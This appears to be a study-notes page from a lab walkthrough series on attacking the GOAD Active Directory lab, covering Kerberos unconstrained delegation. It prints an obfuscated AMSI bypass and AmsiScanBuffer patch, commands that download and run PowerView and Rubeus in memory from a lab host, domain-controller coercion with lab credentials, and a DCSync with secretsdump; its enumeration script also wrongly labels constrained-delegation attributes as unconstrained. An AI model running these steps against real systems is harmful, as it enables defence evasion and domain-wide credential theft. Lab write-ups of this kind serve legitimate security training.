@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD Part 9 - Delegations | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    /* GOAD-specific styles - Large fonts for readability */
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 25px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-content table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 25px 0;
+      font-size: 18px;
+    }
+    
+    .goad-content th, .goad-content td {
+      border: 1px solid var(--jet);
+      padding: 15px;
+      text-align: left;
+    }
+    
+    .goad-content th {
+      background: var(--eerie-black-2);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-content td {
+      color: var(--light-gray);
+    }
+    
+    .part-navigation {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 50px;
+      padding-top: 25px;
+      border-top: 1px solid var(--jet);
+      font-size: 20px;
+    }
+    
+    .part-navigation a {
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      transition: color 0.3s;
+    }
+    
+    .part-navigation a:hover {
+      color: var(--white-2);
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">GOAD Series</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+            <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html">Part 1: Reconnaissance</a></li>
+          <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html">Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
+          <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
+          <li><a href="part-7-privilege-escalation.html">Part 7: PrivEsc</a></li>
+          <li><a href="part-8-lateral-move.html">Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html" class="active">Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html">Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html">Part 11: Trusts</a></li>
+          <li><a href="part-12-having-fun.html">Part 12: Having Fun</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+
+<article class="about active" data-page="about">
+
+        <header class="h2 article-title">Delegations</header>
+
+        <section class="goad-content">
+
+
+
+
+<p>Within an Active Directory, services can be used by users. </p>
+<p>Sometimes these services need to contact others, on behalf of the user, like a web service might need to contact a file server. In order to allow a service to access another service on behalf of the user, a solution has been implemented (introduced in Windows Server 2000) to meet this need: Kerberos Delegation.</p>
+<h2>Delegation principle</h2>
+
+<p>In order to understand what is Kerberos Delegation, let’s take a concrete example. A web server with a nice interface allows a user to access his personal folder, hosted on a file server. We are in the following situation:</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_1.png" alt="">
+
+
+<p>The web server is front-end, and it’s this web server that will fetch the information instead of the user on the file server in order to display the content of a file, for example.</p>
+
+<p>However, the web server does not know what belongs to the user on the file server. It is not his role to unpack the user’s PAC((Privilege Attribute Certificate)) to make a specific demand to the file server. This is where the delegation  comes in. This mechanism allows the web server to impersonate the user, and to authenticate on the user’s behalf to the file server. </p>
+<p>From the file server’s point of view, it is the user who makes the request. The file server will be able to read and check user’s rights, then send back the information to which this account has access. </p>
+<p>This is how the web server can then display this information in a nice interface back to the user.</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_2.png" alt="">
+
+
+
+<h3>Constrained & Unconstrained Delegation</h3>
+
+<p>The ability to relay credentials can be given to an account with at least one SPN attribute set. It could be a computer account or a service account.</p>
+<p>Today, there are three ways to authorize a computer or service accounts to impersonate a user in order to communicate with one or more other service(s) : </p>
+<p>Unconstrained Delegation, Constrained Delegation and Resource Based Constrained Delegation.</p>
+
+
+<h2>Unconstrained Delegation</h2>
+
+<p>For this topic, we will have some explanation and a quick lab right after.</p>
+<p>With Unconstrained Delegation, the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host.</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_3.png" alt="">
+
+
+
+<p>Below there’s an example of a machine that is in Unconstrained Delegation.</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_4.png" alt="">
+
+
+<p>It is historically the only choice there was when the delegation principle was introduced. But for obvious security reason, Constrained Delegation has been added.</p>
+
+<p>The domain controller places a copy of the user’s TGT into the service ticket. When the user’s service ticket (TGS) is provided to the server for service access the server opens the TGS and places the user’s TGT into the LSASS for later use allowing the server to impersonate the user. Obtaining the ticket could lead to domain escalation as the ticket might belong to the machine account of the domain controller or a high privilege account like the domain administrator. For a computer to authenticate on behalf of other services (unconstrained delegation) two conditions are required:</p>
+<p>1. Account has the TRUSTED_FOR_DELEGATION flag in the User Account Control (UAC) flags.</p>
+<p>1. User account has not the NOT_DELEGATED flag set which by default non domain accounts have this flag.</p>
+
+<p>This is a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have Administrator privileges on the machine, you will be able to dump the tickets and impersonate the users on any machine.</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_5.png" alt="">
+
+
+<p>This lab explores a security impact of unrestricted kerberos delegation enabled on a domain computer.</p>
+<p>By default on windows active directory all domain controller are setup with unconstrained delegation</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_6.png" alt="">
+
+
+
+<p>In this lab we will be exploiting the Unconstrained Delegation vulnerability to pivot from a Child Domain north.sevenkingdoms.local to a Parent Domain sevenkingdoms.local.</p>
+<h2>Enumerating </h2>
+
+<p>Unconstrained Delegation can be enumerated using Bloodhound, Impacket and also with PowerView.</p>
+
+<h3>Impacket.</h3>
+
+<h4>Enumerate principals with Unconstrained Delegation</h4>
+
+<p>Works for computers and users</p>
+
+<h4>Powershell</h4>
+
+<p>AMSI Bypass</p>
+<p>$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</p>
+<p>(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')|IEX</p>
+<p>asmi.txt</p>
+<pre><code># Patching amsi.dll AmsiScanBuffer by rasta-mouse
+$Win32 = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+</code></pre>
+
+
+
+<p>We can use the following script in Powershell to enumerate Unconstrained Delegation.</p>
+<pre><code># Import the Active Directory module
+Import-Module ActiveDirectory
+
+# Get a list of all user accounts in the domain
+$users = Get-ADUser -Filter *
+
+foreach ($user in $users) {
+    # Check if the user has the 'msDS-AllowedToDelegateTo' attribute set
+    $delegationSetting = Get-ADUser $user -Properties msDS-AllowedToDelegateTo -ErrorAction SilentlyContinue
+
+    if ($delegationSetting -ne $null -and $delegationSetting.'msDS-AllowedToDelegateTo' -ne $null) {
+        Write-Host "Unconstrained Delegation is enabled for user $($user.SamAccountName)"
+
+        # Get the specific delegation rights
+        $delegationRights = $delegationSetting.'msDS-AllowedToDelegateTo'
+        Write-Host "Delegation Rights for $($user.SamAccountName):"
+        $delegationRights | ForEach-Object {
+            Write-Host "  $_"
+        }
+    }
+}</code></pre>
+
+
+
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_7.png" alt="">
+
+
+
+<h4>PowerView.ps1</h4>
+
+<p>Then we can upload PowerView.ps1 using this</p>
+<p>iex (iwr -UseBasicParsing http://10.4.10.1:8080/PowerView.ps1)</p>
+
+<p>After uploading PowerView.ps1 we just need to the machine we just need to import it. </p>
+<p>Importing PowerShell scripts are really simple. </p>
+<p>. .\PowerView.ps1</p>
+<p>Now we can execute all PowerView commands straightforward:</p>
+<p>Get-DomainComputer -Unconstrained -Properties serviceprincipalname,name,samaccountname,samaccounttype,useraccountcontrol,dnshostname | fl</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_8.png" alt="">
+
+
+
+<p>Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-Table -Wrap</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_9.png" alt="">
+
+
+
+<p>We have gathered enough information to know that we do have Unconstrained Delegation configured in this Machine for user Jon.Snow and its Delegation Rights.</p>
+<p>Unconstrained Delegation is enabled for user jon.snow</p>
+<p>Delegation Rights for jon.snow:</p>
+<p>CIFS/winterfell</p>
+<p>CIFS/winterfell.north.sevenkingdoms.local</p>
+
+
+
+<p>$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.1:8080/Rubeus.exe')</p>
+<p>$assem = [System.Reflection.Assembly]::Load($data);</p>
+<p>[Rubeus.Program]::MainString("triage");</p>
+
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_10.png" alt="">
+
+
+
+
+<p>Now Lets use Coercer force a coerce of the DC kingslanding to the DC winterfell.</p>
+<p>sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell</p>
+<p>Since it will make us passing C several times I decided to automatize it using the following:</p>
+<p>yes C | sudo coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell</p>
+
+
+<p>Now after running Coercer we can check with Rubeus again in memory.</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_11.png" alt="">
+
+
+<p>From the screenshot above we can see that we can see KINGSLANDING$ TGT.</p>
+
+
+
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_12.png" alt="">
+
+
+
+
+<p>We now have the TGT of the domain controller</p>
+<p>Let’s continue on linux to pass the ticket and launch dcsync with secretdump :</p>
+
+<p>cat KINGSLANDING$.b64|base64 -d > KINGSLANDING$.kirbi</p>
+<p>ticketConverter.py KINGSLANDING$.kirbi KINGSLANDING$.ccache</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_13.png" alt="">
+
+
+<p>export KRB5CCNAME=KINGSLANDING$.ccache</p>
+<p>secretsdump.py -k -no-pass sevenkingdoms.local/'kingslanding$'@kingslanding</p>
+<img src="./game-of-active-directory/part-9-delegations/images/screenshot_14.png" alt="">
+
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-8-lateral-move.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 8</a>
+  <a href="part-10-acl.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 10 →</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
